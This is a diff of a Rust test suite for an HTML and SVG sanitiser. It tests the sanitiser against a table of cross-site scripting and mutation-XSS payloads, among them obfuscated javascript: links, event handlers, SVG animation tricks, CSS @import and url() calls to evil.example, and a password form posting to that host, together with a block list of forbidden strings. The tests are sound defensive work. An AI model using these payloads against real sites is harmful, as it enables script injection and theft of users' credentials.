+                "<svg><a><animate attributeName=\"hre&#x66;\" values=\"javascript:alert(1)\"/><text>x</text></a></svg>",
+                Some("<svg><a><text>x</text></a></svg>"),
+            ),
+            (
+                "<svg><set attributeName=\"xlink:hre&#102;\" to=\"javascript:alert(1)\"/></svg>",
+                Some("<svg></svg>"),
+            ),
+            (
+                "<svg><animateTransform attributeName=\"transform\"/><animateMotion/><discard/><rect/></svg>",
+                Some("<svg><rect></rect></svg>"),
+            ),
+            // Finding 3: outside CSS, a phishing form, pings, srcset, images.
+            (
+                "<style>@import url(https://evil.example/x.css); body{}</style><p>x</p>",
+                Some("<p>x</p>"),
+            ),
+            (
+                "<svg><style>@import url(https://evil.example/x.css); .a{fill:red}</style><rect class=\"a\"/></svg>",
+                Some("<svg><rect class=\"a\"></rect></svg>"),
+            ),
+            (
+                "<svg><style>.a{fill:red}</style><style>.b{background:u\\72l(https://evil.example/)}</style></svg>",
+                Some("<svg><style>.a{fill:red}</style></svg>"),
+            ),
+            (
+                "<div style=\"position:fixed;inset:0;background:url(https://evil.example/x.png)\">x</div>",
+                Some("<div style=\"inset:0\">x</div>"),
+            ),
+            (
+                "<div style=\"position : sticky; color: red; background: u\\72l(https://evil.example/)\">x</div>",
+                Some("<div style=\"color: red\">x</div>"),
+            ),
+            (
+                "<div style=\"position:/**/fixed\">x</div>",
+                Some("<div>x</div>"),
+            ),
+            (
+                "<form action=\"https://evil.example/\"><input type=password name=p><button type=submit formaction=\"https://evil.example/\">Go</button></form>",
+                Some("<button>Go</button>"),
+            ),
+            (
+                "<a href=\"https://ok.example/\" ping=\"https://evil.example/\">x</a>",
+                Some("<a href=\"https://ok.example/\">x</a>"),
+            ),
+            (
+                "<img src=\"/a.png\" srcset=\"https://evil.example/x.png 2x\">",
+                Some("<img src=\"/a.png\">"),
+            ),
+            (
+                "<svg><image href=\"http://evil.example/x.png\"/><image xlink:href=\"javascript:alert(1)\"/></svg>",
+                Some("<svg><image></image><image></image></svg>"),
+            ),
+            (
+                "<video src=\"https://ok.example/a.mp4\" poster=\"https://evil.example/p.png\" controls></video>",
+                Some("<video src=\"https://ok.example/a.mp4\" controls=\"\"></video>"),
+            ),
+            // Finding 5: the page's own ids and data attributes.
+            (
+                "<div id=\"site-queue\">{\"tracks\":[]}</div><p id=\"Share-x\" data-site-media data-act=\"toggle\" data-x=\"1\">y</p><b id=\"comments\">z</b>",
+                Some("<div>{&quot;tracks&quot;:[]}</div><p data-x=\"1\">y</p><b>z</b>"),
+            ),
+            // Quoting.
+            ("<a href=javascript:alert(1)>x</a>", Some("<a>x</a>")),
+            ("<a href='javascript:alert(1)'>x</a>", Some("<a>x</a>")),
+            ("<a href=`javascript:alert(1)`>x</a>", Some("<a>x</a>")),
+            (
+                "<a title='a\"b' href=/x>x</a>",
+                Some("<a title=\"a&quot;b\" href=\"/x\">x</a>"),
+            ),
+            // Duplicate attributes: the first is the browser's.
+            (
+                "<a href=\"https://ok.example/\" href=\"javascript:alert(1)\">x</a>",
+                Some("<a href=\"https://ok.example/\">x</a>"),
+            ),
+            (
+                "<a href=\"javascript:alert(1)\" HREF=\"https://ok.example/\">x</a>",
+                Some("<a>x</a>"),
+            ),
+            // Null and control bytes in names and schemes.
+            ("<a hr\0ef=\"javascript:alert(1)\">x</a>", Some("<a>x</a>")),
+            ("<a href=\"java\0script:alert(1)\">x</a>", Some("<a>x</a>")),
+            (
+                "<a href=\"\u{1}javascript:alert(1)\">x</a>",
+                Some("<a>x</a>"),
+            ),
+            (
+                "<a href=\"java&#0;script:alert(1)\">x</a>",
+                Some("<a>x</a>"),
+            ),
+            (
+                "<a href=\"javascript&colon;alert(1)\">x</a>",
+                Some("<a>x</a>"),
+            ),
+            ("<svg on\u{b}load=alert(1)></svg>", Some("<svg></svg>")),
+            ("<scr\0ipt>alert(1)</scr\0ipt>", Some("alert(1)")),
+            (
+                "<img src=\"data\t:image/svg+xml,&lt;svg onload=alert(1)&gt;\">",
+                Some("<img>"),
+            ),
+            (
+                "<a href=\"//evil.example/\">x</a><a href=\"/\\evil.example/\">y</a>",
+                Some("<a>x</a><a>y</a>"),
+            ),
+            ("<a href=\"http://evil.example/\">x</a>", Some("<a>x</a>")),
+            (
+                "<a href=\"mailto:a@b.example\">m</a><a href=\"x/y?z#w\">r</a>",
+                Some("<a href=\"mailto:a@b.example\">m</a><a href=\"x/y?z#w\">r</a>"),
+            ),
+            // Elements whose content a browser reads differently.
+            (
+                "<svg><title><script>alert(1)</script><div>t</div></title></svg>",
+                Some("<svg><title>t</title></svg>"),
+            ),
+            (
+                "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\"></p></noscript>",
+                None,
+            ),
+            (
+                "<template><script>alert(1)</script></template>ok",
+                Some("ok"),
+            ),
+            (
+                "<textarea><script>alert(1)</script></textarea>ok",
+                Some("ok"),
+            ),
+            ("<xmp><script>alert(1)</script></xmp>ok", Some("ok")),
+            ("<plaintext><script>alert(1)</script>", Some("")),
+            (
+                "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
+                Some(""),
+            ),
+            (
+                "<svg><p><style><img src=x onerror=alert(1)></style></p></svg>",
+                Some("<svg></svg>"),
+            ),
+            // Comments, CDATA, processing instructions, a doctype.
+            ("<!--<img src=x onerror=alert(1)>-->ok", Some("ok")),
+            ("<!--><img src=x onerror=alert(1)>-->ok", Some("ok")),
+            (
+                "<svg><![CDATA[<script>alert(1)</script>]]></svg>",
+                Some("<svg>&lt;script&gt;alert(1)&lt;/script&gt;</svg>"),
+            ),
+            (
+                "<?xml-stylesheet href=\"https://evil.example/x.css\"?><p>x</p>",
+                Some("<p>x</p>"),
+            ),
+            ("<!DOCTYPE html><p>x</p>", Some("<p>x</p>")),
+            // Links inside the drawing only.
+            (
+                "<svg><use href=\"https://evil.example/x.svg#a\"/><use xlink:href=\"data:image/svg+xml;base64,PHN2Zz4=#x\"/><use href=\"#a\"/></svg>",
+                Some("<svg><use></use><use></use><use href=\"#a\"></use></svg>"),
+            ),
+            (
+                "<svg><rect fill=\"url(https://evil.example/x.svg#p)\"/><rect fill=\"url( '#p')\" mask=\"u\\72l(x)\"/></svg>",
+                Some("<svg><rect></rect><rect fill=\"url( &#39;#p&#39;)\"></rect></svg>"),
+            ),
+            // Handlers, frames, the rest.
+            (
+                "<div is=\"x-y\" srcdoc=\"<script>alert(1)</script>\" onclick=\"x()\" tabindex=\"1\">d</div><details open ontoggle=alert(1)></details>",
+                Some("<div>d</div><details open=\"\"></details>"),
+            ),
+            (
+                "<svg><foreignObject><div onclick=\"x()\"><script>alert(1)</script></div></foreignObject><rect/></svg>",
+                Some("<svg><rect></rect></svg>"),
+            ),
+            (
+                "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe><object data=\"x\"></object><embed src=\"x\"><base href=\"/\"><meta http-equiv=refresh content=\"0;url=javascript:alert(1)\"><link rel=stylesheet href=\"https://evil.example/x.css\">ok",
+                Some("ok"),
+            ),
+            ("<image src=\"https://ok.example/a.png\">", Some("")),
+            (
+                "<rect/><div><svg><div>x</div></svg></div>",
+                Some("<div><svg>x</svg></div>"),
+            ),
         ];
-        for markup in bad {
-            let out = sanitize(markup).to_ascii_lowercase();
-            for never in [
-                "<script",
-                "<foreignobject",
-                "<iframe",
-                "<object",
-                "<embed",
-                "<img",
-                "<base",
-                "<meta",
-                "<set",
-                "<animate",
-                " on",
-                "javascript",
-                "srcdoc",
-                "data:text",
-                "data:image/svg",
-                "evil.example",
-            ] {
-                assert!(!out.contains(never), "{never} in {out}\n  from {markup}");
+        let never = [
+            "<script",
+            "<style>@",
+            "<form",
+            "<input",
+            "<animate",
+            "<set",
+            "<foreignobject",
+            "<iframe",
+            "<img src=\"x\" on",
+            " on",
+            "javascript",
+            "evil.example",
+            "srcdoc",
+            "srcset",
+            "ping=",
+            "action=",
+            "site-queue",
+            "data-site",
+        ];
+        for (markup, expected) in table {
+            let out = bounded(markup);
+            if let Some(expected) = expected {
+                assert_eq!(&out, expected, "from {markup}");
             }
+            let lower = out.to_ascii_lowercase();
+            for bad in never {
+                assert!(!lower.contains(bad), "{bad} in {out}\n  from {markup}");
+            }
+            assert_safe(&out, markup);
+            assert_eq!(sanitize(&out), out, "not stable: {markup}");
         }
     }
 
-    /// A style sheet is raw text: markup in it stays text, without a `<`
-    /// that could open a tag in an SVG, where a `<style>` is not raw.
-    #[test]
-    fn a_style_sheet_holds_no_markup() {
-        assert_eq!(
-            sanitize("<svg><style><img src=x onerror=alert(1)></style><rect/></svg>"),
-            "<svg><style>img src=x onerror=alert(1)></style><rect></rect></svg>"
+    /// The property the table is held to, checked by a reader of its own
+    /// (not the sanitiser's rules): every `<` in `out` opens or closes an
+    /// allowed element, every attribute is allowed and double-quoted, and
+    /// every URL has an allowed scheme.
+    fn assert_safe(out: &str, from: &str) {
+        let allowed_tag = |t: &str| SVG_ELEMENTS.contains(&t) || HTML_ELEMENTS.contains(&t);
+        let mut rest = out;
+        while let Some((_, after)) = rest.split_once('<') {
+            if let Some(end) = after.strip_prefix('/') {
+                let (name, tail) = end.split_once('>').expect("an end tag ends");
+                assert!(allowed_tag(name), "</{name}> in {out}\n  from {from}");
+                rest = tail;
+                continue;
+            }
+            let end = after
+                .find([' ', '>'])
+                .unwrap_or_else(|| panic!("a tag ends in {out}"));
+            let (name, mut tail) = after.split_at(end);
+            assert!(allowed_tag(name), "<{name}> in {out}\n  from {from}");
+            while let Some(attr) = tail.strip_prefix(' ') {
+                let (attr_name, value_at) = attr.split_once("=\"").expect("attr=\"value\"");
+                let (value, past) = value_at.split_once('"').expect("a closing quote");
+                assert!(!value.contains('<'), "< in a value: {out}");
+                check_attr(name, attr_name, &decode(value), out, from);
+                tail = past;
+            }
+            let after_tag = tail.strip_prefix('>').expect("a tag ends with >");
+            if name == "style" {
+                let (css, past) = after_tag.split_once("</style>").expect("a closed sheet");
+                assert!(!css.contains('<') && !css.contains('&'), "{out}");
+                assert!(css_ok(css), "a sheet that loads: {out}\n  from {from}");
+                rest = past;
+                continue;
+            }
+            rest = after_tag;
+        }
+    }
+
+    fn check_attr(tag: &str, name: &str, value: &str, out: &str, from: &str) {
+        let lower = name.to_ascii_lowercase();
+        let known = [
+            "class",
+            "id",
+            "title",
+            "lang",
+            "dir",
+            "role",
+            "style",
+            "href",
+            "xlink:href",
+            "src",
+            "alt",
+            "width",
+            "height",
+            "controls",
+            "preload",
+            "type",
+            "datetime",
+            "colspan",
+            "rowspan",
+            "span",
+            "open",
+            "xmlns",
+            "xmlns:xlink",
+        ];
+        assert!(
+            known.contains(&lower.as_str())
+                || lower.starts_with("aria-")
+                || (lower.starts_with("data-") && !lower.starts_with("data-site-"))
+                || SVG_ATTRS.contains(&lower.as_str()),
+            "{name} on <{tag}> in {out}\n  from {from}"
         );
-        assert_eq!(
-            sanitize("<style>a{}</STYLE ><script>x()</script>"),
-            "<style>a{}</style>"
-        );
+        assert!(!lower.starts_with("on"), "{name} in {out}");
+        if lower == "id" {
+            assert!(!value.to_ascii_lowercase().starts_with("site-"), "{out}");
+        }
+        if matches!(lower.as_str(), "href" | "xlink:href" | "src") {
+            let url: String = value
+                .chars()
+                .filter(|c| !c.is_ascii_whitespace() && !c.is_control())
+                .collect::<String>()
+                .to_ascii_lowercase();
+            let scheme = url
+                .split_once(':')
+                .filter(|(s, _)| !s.contains(['/', '?', '#']))
+                .map(|(s, _)| s);
+            let ok = match scheme {
+                None => !url.starts_with("//") && !url.starts_with("/\\"),
+                Some("https" | "mailto") => true,
+                Some("data") => ["png", "jpeg", "gif", "webp"]
+                    .iter()
+                    .any(|k| url.starts_with(&format!("data:image/{k}"))),
+                Some(_) => false,
+            };
+            assert!(ok, "{name}={value} in {out}\n  from {from}");
+        }
+        if lower == "style" || SVG_ATTRS.contains(&lower.as_str()) {
+            let squeezed: String = value
+                .chars()
+                .filter(|c| !c.is_whitespace())
+                .collect::<String>()
+                .to_ascii_lowercase();
+            assert!(
+                !squeezed.contains("@import")
+                    && !squeezed.contains("position:fixed")
+                    && !squeezed.contains('\\')
+                    && local_refs_only(&squeezed),
+                "{name}={value} in {out}\n  from {from}"
+            );
+        }
     }
 
     #[test]
-    fn it_is_always_well_formed() {
+    fn the_rules_by_themselves() {
+        assert_eq!(element_rule("foreignObject", true), Rule::Drop);
+        assert_eq!(element_rule("SCRIPT", false), Rule::Drop);
+        assert_eq!(element_rule("set", true), Rule::Drop);
+        assert_eq!(element_rule("animate", true), Rule::Drop);
         assert_eq!(
-            sanitize("<div><svg><g><rect></div>tail</span>"),
-            "<div><svg><g><rect></rect></g></svg></div>tail"
+            element_rule("lineargradient", true),
+            Rule::Keep("linearGradient")
         );
-        assert_eq!(sanitize("a < b && c > d"), "a &lt; b &amp;&amp; c &gt; d");
-        assert_eq!(sanitize("<p title=a\"b>x"), "<p title=\"a&quot;b\">x</p>");
-        assert_eq!(sanitize("<br><hr/><p/>"), "<br><hr><p></p>");
-        assert_eq!(sanitize("<\"x\">"), "&lt;&quot;x&quot;&gt;");
-    }
-
-    #[test]
-    fn element_rules_drop_the_same_things() {
-        assert!(drops_element("foreignObject", std::iter::empty()));
-        assert!(drops_element("SCRIPT", std::iter::empty()));
-        assert!(drops_element(
-            "set",
-            [("attributeName", "xlink:href")].into_iter()
-        ));
-        assert!(!drops_element(
-            "animate",
-            [("attributeName", "x")].into_iter()
-        ));
-        assert!(!drops_element("rect", std::iter::empty()));
-        assert!(keeps_attr("rect", "data-at", "1.5"));
-        assert!(keeps_attr("svg", "viewBox", "0 0 1 1"));
-        assert!(!keeps_attr("rect", "onclick", "x()"));
-        assert!(!keeps_attr("a", "href", "\tjavascript:x"));
-        assert!(keeps_attr("img", "src", "data:image/png;base64,AA"));
-        assert!(!keeps_attr("use", "href", "other.svg#x"));
+        assert_eq!(element_rule("rect", false), Rule::Unwrap);
+        assert_eq!(element_rule("div", true), Rule::Unwrap);
+        assert_eq!(element_rule("style", false), Rule::Drop);
+        assert_eq!(element_rule("style", true), Rule::Keep("style"));
+        assert_eq!(element_rule("form", false), Rule::Unwrap);
+        assert_eq!(
+            attr_rule("rect", "data-at", "1.5", true).as_deref(),
+            Some("1.5")
+        );
+        assert_eq!(
+            attr_rule("svg", "viewBox", "0 0 1 1", true).as_deref(),
+            Some("0 0 1 1")
+        );
+        assert_eq!(attr_rule("div", "viewBox", "0 0 1 1", false), None);
+        assert_eq!(attr_rule("rect", "onclick", "x()", true), None);
+        assert_eq!(attr_rule("a", "href", "\tjavascript:x", false), None);
+        assert_eq!(
+            attr_rule("a", "href", "https://ok.example/", false).as_deref(),
+            Some("https://ok.example/")
+        );
+        assert!(attr_rule("img", "src", "data:image/png;base64,AA", false).is_some());
+        assert_eq!(
+            attr_rule("img", "src", "data:image/svg+xml;base64,AA", false),
+            None
+        );
+        assert_eq!(
+            attr_rule("audio", "src", "data:audio/mp3;base64,AA", false),
+            None
+        );
+        assert_eq!(attr_rule("use", "href", "other.svg#x", true), None);
+        assert_eq!(attr_rule("button", "type", "submit", false), None);
     }
 
     /// `markup` sanitised, checked for the linear bound: at most one loop
@@ -679,14 +1429,39 @@ mod tests {
     /// own `<`, which it wrote as `&lt;` and returned unread, forever.
     #[test]
     fn a_closed_style_sheet_ends() {
-        assert_eq!(bounded("<style>a{}</style>b"), "<style>a{}</style>b");
+        assert_eq!(bounded("<style>a{}</style>b"), "b");
         assert_eq!(
             bounded("<svg><style>.x{}</style><rect/></svg>"),
             "<svg><style>.x{}</style><rect></rect></svg>"
         );
         // An end tag that only starts like one, and one never ended.
-        assert_eq!(bounded("<style>a</styles>b</style"), "<style>ab</style>");
+        assert_eq!(bounded("<svg><style>a</styles>b</style"), "<svg></svg>");
+        assert_eq!(bounded("<style>a</styles>b</style"), "");
         bounded(&"<style></style>".repeat(10_000));
+        bounded(&"<svg><style></style>".repeat(10_000));
+    }
+
+    /// A sheet that holds markup is dropped whole: in an SVG a `<style>`
+    /// is not raw text, so its `<` would open a tag.
+    #[test]
+    fn a_style_sheet_holds_no_markup() {
+        assert_eq!(
+            sanitize("<svg><style><img src=x onerror=alert(1)></style><rect/></svg>"),
+            "<svg><rect></rect></svg>"
+        );
+        assert_eq!(sanitize("<style>a{}</STYLE ><script>x()</script>"), "");
+    }
+
+    #[test]
+    fn it_is_always_well_formed() {
+        assert_eq!(
+            sanitize("<div><svg><g><rect></div>tail</span>"),
+            "<div><svg><g><rect></rect></g></svg></div>tail"
+        );
+        assert_eq!(sanitize("a < b && c > d"), "a &lt; b &amp;&amp; c &gt; d");
+        assert_eq!(sanitize("<p title=a\"b>x"), "<p title=\"a&quot;b\">x</p>");
+        assert_eq!(sanitize("<br><hr/><p/>"), "<br><hr><p></p>");
+        assert_eq!(sanitize("<\"x\">"), "&lt;&quot;x&quot;&gt;");
     }
 
     #[test]
@@ -719,10 +1494,13 @@ mod tests {
             "<script></script",
             "<style>",
             "<style></",
+            "<svg><style>",
+            "<svg><style></",
             "<p title=\"&amp\">&lt",
         ] {
             let out = bounded(markup);
             assert!(!out.to_ascii_lowercase().contains("<script"), "{out}");
+            assert_safe(&out, markup);
         }
         assert_eq!(bounded("&amp"), "&amp;amp");
         assert_eq!(bounded("<svg><g><rect>"), "<svg><g><rect></rect></g></svg>");
@@ -741,19 +1519,22 @@ mod tests {
             "<a ".repeat(n / 3),
             format!("<p title=\"{}\">x</p>", "\"'&".repeat(n / 3)),
             format!("<rect data-at=\"{}", "9".repeat(n)),
+            format!("<a {}>", "b ".repeat(n / 2)),
             format!("<script>{}", "<script".repeat(n / 7)),
             format!("<script>{}>", "</script<b".repeat(n / 10)),
-            "<g>".repeat(n / 3),
-            format!("{}{}", "<g>".repeat(n / 6), "</x>".repeat(n / 8)),
+            format!("<svg>{}", "<g>".repeat(n / 3)),
+            format!("<svg>{}{}", "<g>".repeat(n / 6), "</x>".repeat(n / 8)),
             "<svg><foreignObject>".repeat(n / 20),
+            "<svg><style>".repeat(n / 12),
+            format!("<div style=\"{}\">", "a:b;/*".repeat(n / 6)),
             "<!--".repeat(n / 4),
         ] {
             let out = bounded(&markup);
             assert!(!out.to_ascii_lowercase().contains("<script"));
         }
         // Nesting past `MAX_OPEN` writes no more start tags.
-        let deep = bounded(&"<g>".repeat(n / 3));
-        assert_eq!(deep.matches("<g>").count(), MAX_OPEN);
-        assert_eq!(deep.matches("</g>").count(), MAX_OPEN);
+        let deep = bounded(&format!("<svg>{}", "<g>".repeat(n / 3)));
+        assert_eq!(deep.matches("<g>").count(), MAX_OPEN - 1);
+        assert_eq!(deep.matches("</g>").count(), MAX_OPEN - 1);
     }
 }
